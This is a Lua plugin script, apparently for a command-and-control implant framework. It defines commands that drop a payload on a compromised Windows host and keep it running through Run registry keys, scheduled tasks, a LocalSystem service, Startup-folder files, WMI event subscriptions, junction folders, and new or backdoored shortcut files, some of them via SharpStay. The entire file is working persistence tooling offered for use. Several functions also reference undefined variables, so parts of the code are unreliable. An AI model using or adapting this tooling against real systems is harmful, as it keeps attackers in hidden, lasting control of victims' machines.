local time = require("time")
local strings = require("strings")
local persistdefaults = {
    displayname = "WinSvc",
    regkeyname = "WinReg",
    registry_key = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    taskname = "WinTask",
    servicename = "WinSvc",
    eventname = "WinEvent",
    attime = "startup",
    lnkpath = "",
    command = "",
    droplocation = "C:\\Windows\\Temp\\Stay.exe",
    clsid = "",
    dllpath = "",
    customfile = "",
    listener = "",
    template = "",
    staged = "false",
    x86 = "false",
    findreplace = "$$PAYLOAD$$",
    shellcodeformat = "base64"
}

local function run_Registry_Key(cmd, args)
    local regkeyname, command, drop_location, custom_file, custom_file_content,
          template, registry_key, clean_up
    local reg_key_name = cmd:Flags():GetString("reg_key_name")
    local command = cmd:Flags():GetString("command")
    local drop_location = cmd:Flags():GetString("drop_location")
    local use_malefic_as_custom_file = cmd:Flags():GetBool(
                                           "use_malefic_as_custom_file")
    local custom_file = cmd:Flags():GetString("custom_file")
    local registry_key = cmd:Flags():GetString("registry_key")
    local session = active()

    if reg_key_name ~= "" then
        regkeyname = reg_key_name
    else
        regkeyname = persistdefaults.regkeyname
    end

    if use_malefic_as_custom_file and custom_file ~= "" then
        error("Cannot use both custom file and use_malefic_as_custom_file")
        return
    end

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content
    if use_malefic_as_custom_file then
        custom_file_content = self_artifact(session)
    else
        if custom_file == "" then
            custom_file = persistdefaults.customfile
        end
        custom_file_content = read(custom_file)
    end

    if command == "" then
        if drop_location ~= "" then
            command = drop_location
        else
            command = persistdefaults.command
        end
    end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    local hive, path
    if registry_key ~= "" then
        hive = registry_key:split("\\")[1]
        path = registry_key:split("\\")[2]
    end

    return reg_add(session, hive, path, regkeyname, "REG_SZ", command)
end

local cmd_registry_key = command("persistence:Registry_Key", run_Registry_Key,
                                 "persistence via Windows Registry Key",
                                 "T1547.001")
cmd_registry_key:Flags():String("reg_key_name", persistdefaults.registry_key,
                                "Name of the registry key to create or modify")
cmd_registry_key:Flags():String("command", "",
                                "Command to execute via the registry key")
cmd_registry_key:Flags():String("drop_location", persistdefaults.droplocation,
                                "File path where payload is dropped")
cmd_registry_key:Flags():Bool("use_malefic_as_custom_file", false,
                              "Use Malefic file as custom payload")
cmd_registry_key:Flags():String("custom_file", persistdefaults.customfile,
                                "custom_file")
cmd_registry_key:Flags():String("registry_key", persistdefaults.registry_key,
                                "Full registry key path (e.g., HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)")
-- cmd_registry_key:Flags():Bool("clean_up", false, "clean_up")

function run_scheduled_task(cmd, args)
    local taskname = cmd:Flags():GetString("taskname")
    local command = cmd:Flags():GetString("command")
    local custom_file = cmd:Flags():GetString("custom_file")
    local drop_location = cmd:Flags():GetString("drop_location")
    local use_malefic_as_custom_file = cmd:Flags():GetBool(
                                           "use_malefic_as_custom_file")
    local trigger = cmd:Flags():GetInt("trigger")
    local session = active()

    taskname = taskname ~= "" and taskname or persistdefaults.taskname

    if use_malefic_as_custom_file and custom_file ~= "" then
        error("Cannot use both custom file and use_malefic_as_custom_file")
        return
    end

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content
    if use_malefic_as_custom_file then
        custom_file_content = self_artifact(session)
    else
        if custom_file == "" then
            custom_file = persistdefaults.customfile
        end
        custom_file_content = read(custom_file)
    end

    if command == "" then
        if drop_location ~= "" then
            command = drop_location
        else
            command = persistdefaults.command
        end
    end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    return taskschd_create(session, taskname, drop_location, trigger,
                           "2023-10-10T09:00:00")
end

local cmd_scheduled_task = command("persistence:Scheduled_Task",
                                   run_scheduled_task, "persistence",
                                   "T1053.002")
cmd_scheduled_task:Flags():String("taskname", persistdefaults.taskname,
                                  "taskname")
cmd_scheduled_task:Flags():String("command", persistdefaults.command,
                                  "Command to execute via the registry key")
cmd_scheduled_task:Flags():Int("trigger", 9, "trigger")
cmd_scheduled_task:Flags():String("drop_location", persistdefaults.droplocation,
                                  "File path where payload is dropped")
cmd_scheduled_task:Flags():Bool("use_malefic_as_custom_file", false,
                                "Use Malefic file as custom payload")
cmd_scheduled_task:Flags():String("custom_file", "",
                                  "custom_file which will be uploaded")

local function run_service_install(cmd, args)
    local session = active()
    local service_name = cmd:Flags():GetString("service_name")
    local display_name = cmd:Flags():GetString("display_name")
    local custom_file = cmd:Flags():GetString("custom_file")
    local drop_location = cmd:Flags():GetString("drop_location")
    local use_malefic_as_custom_file = cmd:Flags():GetBool(
                                           "use_malefic_as_custom_file")
    local start_type = cmd:Flags():GetString("start_type")
    local error_control = cmd:Flags():GetString("error_control")
    local account_name = cmd:Flags():GetString("account_name")

    if custom_file and use_malefic_as_custom_file then
        error("Cannot use both custom file and use_malefic_as_custom_file")
        return
    end

    service_name = service_name ~= "" and service_name or
                       persistdefaults.servicename
    display_name = display_name ~= "" and display_name or
                       persistdefaults.displayname
    if use_malefic_as_custom_file and custom_file ~= "" then
        error("Cannot use both custom file and use_malefic_as_custom_file")
        return
    end

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content
    if use_malefic_as_custom_file then
        custom_file_content = self_artifact(session)
    else
        if custom_file == "" then
            custom_file = persistdefaults.customfile
        end
        custom_file_content = read(custom_file)
    end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    return service_create(session, service_name, display_name, drop_location,
                          start_type, error_control, account_name)
end

local cmd_service_install = command("persistence:Install_Service",
                                    run_service_install, "persistence",
                                    "T1543.003")
cmd_service_install:Flags():String("service_name", persistdefaults.servicename,
                                   "service_name")
cmd_service_install:Flags():String("display_name", persistdefaults.displayname,
                                   "Display Name of the service")
cmd_service_install:Flags():String("start_type", "AutoStart",
                                   "Type of service startup")
cmd_service_install:Flags():String("error_control", "Ignore",
                                   "Service error handling (e.g., Ignore, Normal)")
cmd_service_install:Flags():String("account_name", "LocalSystem",
                                   "account of the service")
cmd_service_install:Flags():String("drop_location",
                                   persistdefaults.droplocation,
                                   "File path where payload is dropped")
cmd_service_install:Flags():String("custom_file", "",
                                   "custom_file which will be uploaded")
cmd_service_install:Flags():Bool("use_malefic_as_custom_file", false,
                                 "use_malefic_as_custom_file")
cmd_service_install:Flags():String("command", persistdefaults.command,
                                   "Command to execute via the registry key")

local function run_startup_folder(cmd, args)
    local use_current_user = cmd:Flags():GetString(
                                 "use_current_user_startupfolder")
    local use_malefic_as_custom_file = cmd:Flags():GetBool(
                                           "use_malefic_as_custom_file")
    local custom_file = cmd:Flags():GetString("custom_file")
    local filename = cmd:Flags():GetString("filename")
    local session = active()
    local username = session.Os.Username
    local drop_location

    if custom_file and use_malefic_as_custom_file then
        error("Cannot use both custom file and use_malefic_as_custom_file")
        return
    end

    if use_current_user then
        drop_location = "C:\\Users\\" .. username ..
                            "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" ..
                            filename
    else
        drop_location =
            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" ..
                filename
    end

    if custom_file and use_malefic_as_custom_file then
        error("Cannot use both custom file and use_malefic_as_custom_file")
        return
    end

    service_name = service_name ~= "" and service_name or
                       persistdefaults.servicename
    display_name = display_name ~= "" and display_name or
                       persistdefaults.displayname
    if use_malefic_as_custom_file and custom_file ~= "" then
        error("Cannot use both custom file and use_malefic_as_custom_file")
        return
    end

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content
    if use_malefic_as_custom_file then
        custom_file_content = self_artifact(session)
    else
        if custom_file == "" then
            custom_file = persistdefaults.customfile
        end
        custom_file_content = read(custom_file)
    end

    if command == "" then
        if drop_location ~= "" then
            command = drop_location
        else
            command = persistdefaults.command
        end
    end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end
end

local cmd_startup_folder = command("persistence:startup_folder",
                                   run_startup_folder,
                                   "persistence via startup folder", "T1547.001")
cmd_startup_folder:Flags():Bool("use_current_user_startupfolder", true,
                                "use_current_user_startupfolder")
cmd_startup_folder:Flags():String("filename", "Stay.exe",
                                  "filename of executable file to be run at startup.")
cmd_startup_folder:Flags():String("custom_file", "",
                                  "custom_file which will be uploaded")
cmd_startup_folder:Flags():Bool("use_malefic_as_custom_file", false,
                                "use_malefic_as_custom_file")

local function run_wmi_event(cmd, args)
    local session = active()
    local eventname = cmd:Flags():GetString("eventname")
    local command = cmd:Flags():GetString("command")
    local attime = cmd:Flags():GetString("attime")
    local custom_file = cmd:Flags():GetString("custom_file")
    local drop_location = cmd:Flags():GetString("drop_location")
    local use_malefic_as_custom_file = cmd:Flags():GetBool(
                                           "use_malefic_as_custom_file")

    if custom_file and use_malefic_as_custom_file then
        error("Cannot use both custom file and use_malefic_as_custom_file")
        return
    end

    eventname = eventname ~= "" and eventname or persistdefaults.eventname

    if use_malefic_as_custom_file and custom_file ~= "" then
        error("Cannot use both custom file and use_malefic_as_custom_file")
        return
    end

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content
    if use_malefic_as_custom_file then
        custom_file_content = self_artifact(session)
    else
        if custom_file == "" then
            custom_file = persistdefaults.customfile
        end
        custom_file_content = read(custom_file)
    end

    if command == "" then
        if drop_location ~= "" then
            command = drop_location
        else
            command = persistdefaults.command
        end
    end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    local sharpstay = "StayKit/SharpStay.exe"

    sharp_args = {
        "action=WMIEventSub", "eventname=" .. eventname, "attime=" .. attime,
        "command=" .. command
    }
    return execute_assembly(session, script_resource(sharpstay), sharp_args,
                            true, new_sac())
end

local cmd_wmi_event = command("persistence:WMI_Event", run_wmi_event,
                              "persistence", "T1546.003")
cmd_wmi_event:Flags()
    :String("eventname", persistdefaults.eventname, "eventname")
cmd_wmi_event:Flags():String("command", "", "Command to execute")
cmd_wmi_event:Flags():String("attime", "startup", "At Time: ")
cmd_wmi_event:Flags():String("custom_file", "",
                             "custom_file which will be uploaded")
cmd_wmi_event:Flags():String("drop_location", persistdefaults.droplocation,
                             "File path where payload is dropped")
cmd_wmi_event:Flags():Bool("use_malefic_as_custom_file", false,
                           "use_malefic_as_custom_file")

local function run_JunctionFolder(cmd, args)
    local session = active()
    local dllpath = cmd:Flags():GetString("dllpath")
    local guid = cmd:Flags():GetString("guid")
    local drop_location = cmd:Flags():GetString("drop_location")
    local custom_file = cmd:Flags():GetString("custom_file")
    local use_malefic_as_custom_file = cmd:Flags():GetBool(
                                           "use_malefic_as_custom_file")

    if custom_file and use_malefic_as_custom_file then
        error("Cannot use both custom file and use_malefic_as_custom_file")
        return
    end
    dllpath = dllpath ~= "" and dllpath or "C:\\windows\\system32\\ntdll.dll"
    guid = guid ~= "" and guid or "8d1c5b23-6907-4d3d-9da2-920b54d0753c"
    if use_malefic_as_custom_file and custom_file ~= "" then
        error("Cannot use both custom file and use_malefic_as_custom_file")
        return
    end

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content
    if use_malefic_as_custom_file then
        custom_file_content = self_artifact(session)
    else
        if custom_file == "" then
            custom_file = persistdefaults.customfile
        end
        custom_file_content = read(custom_file)
    end

    if command == "" then
        if drop_location ~= "" then
            command = drop_location
        else
            command = persistdefaults.command
        end
    end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    sharp_args = {
        "action=JunctionFolder", "dllpath=" .. dllpath, "guid=" .. guid
    }

    return execute_assembly(session, script_resource(file_path), sharp_args,
                            true, false, false)
end

local cmd_junction_folder = command("persistence:Junction_Folder",
                                    run_JunctionFolder, "persistence", "")
cmd_junction_folder:Flags():String("dllpath", "", "dllpath")
cmd_junction_folder:Flags():String("guid", "", "guid")
cmd_junction_folder:Flags():String("drop_location", "", "drop_location")
cmd_junction_folder:Flags():String("custom_file", "", "custom_file")
cmd_junction_folder:Flags():Bool("use_malefic_as_custom_file", false,
                                 "use_malefic_as_custom_file")

local function run_newlnk(cmd, args)
    local session = active()
    local filepath = cmd:Flags():GetString("filepath")
    local lnkname = cmd:Flags():GetString("lnkname")
    local lnktarget = cmd:Flags():GetString("lnktarget")
    local lnkicon = cmd:Flags():GetString("lnkicon")
    local command = cmd:Flags():GetString("command")
    local drop_location = cmd:Flags():GetString("drop_location")
    local custom_file = cmd:Flags():GetString("custom_file")
    local use_malefic_as_custom_file = cmd:Flags():GetBool(
                                           "use_malefic_as_custom_file")

    if use_malefic_as_custom_file and custom_file ~= "" then
        error("Cannot use both custom file and use_malefic_as_custom_file")
        return
    end

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content
    if use_malefic_as_custom_file then
        custom_file_content = self_artifact(session)
    else
        if custom_file == "" then
            custom_file = persistdefaults.customfile
        end
        custom_file_content = read(custom_file)
    end

    if command == "" then
        if drop_location ~= "" then
            command = drop_location
        else
            command = persistdefaults.command
        end
    end

    if lnktarget == "" and drop_location ~= "" then lnktarget = drop_location end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    sharp_args = {
        "action=NewLnk", "filepath=" .. filepath, "lnkname=" .. lnkname,
        "lnktarget=" .. lnktarget, "lnkicon=" .. lnkicon, "command=" .. command
    }

    local file_path = "StayKit/SharpStay.exe"
    return execute_assembly(session, script_resource(file_path), sharp_args,
                            true, new_sac())
end

local cmd_newlnk = command("persistence:NewLnk", run_newlnk, "persistence",
                           "T1547.009")
cmd_newlnk:Flags():String("filepath", "", "filepath")
cmd_newlnk:Flags():String("lnkname", "", "lnkname")
cmd_newlnk:Flags():String("lnktarget", "", "lnktarget")
cmd_newlnk:Flags():String("lnkicon", "", "lnkicon")
cmd_newlnk:Flags():String("command", "", "command")
cmd_newlnk:Flags():String("drop_location", "", "drop_location")
cmd_newlnk:Flags():String("custom_file", "", "custom_file")
cmd_newlnk:Flags():Bool("use_malefic_as_custom_file", false,
                        "use_malefic_as_custom_file")

local function run_backdoorlnk(cmd, args)
    local session = active()
    local lnkpath = cmd:Flags():GetString("lnkpath")
    local command = cmd:Flags():GetString("command")
    local drop_location = cmd:Flags():GetString("drop_location")
    local custom_file = cmd:Flags():GetString("custom_file")
    local use_malefic_as_custom_file = cmd:Flags():GetBool(
                                           "use_malefic_as_custom_file")

    if lnkpath == "" then
        -- lnkpath = "C:\\users\\" .. session.Os.Username .. "\\desktop\\Excel.lnk"
        error("lnkpath is required")
        return
    end

    if use_malefic_as_custom_file and custom_file ~= "" then
        error("Cannot use both custom file and use_malefic_as_custom_file")
        return
    end

    if drop_location == "" then drop_location = persistdefaults.droplocation end

    local custom_file_content
    if use_malefic_as_custom_file then
        custom_file_content = self_artifact(session)
    else
        if custom_file == "" then
            custom_file = persistdefaults.customfile
        end
        custom_file_content = read(custom_file)
    end

    if command == "" then
        if drop_location ~= "" then
            command = drop_location
        else
            command = persistdefaults.command
        end
    end

    if drop_location ~= "" then
        uploadraw(session, custom_file_content, drop_location, "0644", false)
    end

    sharp_args = {
        "action=BackdoorLnk", "lnkpath=" .. lnkpath, "command=" .. command
    }
    local file_path = "StayKit/SharpStay.exe"
    return execute_assembly(session, script_resource(file_path), sharp_args,
                            true, new_sac())
end

local cmd_backdoorlnk = command("persistence:BackdoorLnk", run_backdoorlnk,
                                "persistence", "T1547.009")
cmd_backdoorlnk:Flags():String("lnkpath", "",
                               "The original path of the .lnk file to be replaced.")
cmd_backdoorlnk:Flags():String("command", "",
                               "The new command to be set for the .lnk file.")
cmd_backdoorlnk:Flags():String("drop_location", "",
                               "File path where payload is dropped")
cmd_backdoorlnk:Flags():String("custom_file", "",
                               "custom_file which will be uploaded")
cmd_backdoorlnk:Flags():Bool("use_malefic_as_custom_file", false,
                             "use_malefic_as_custom_file")
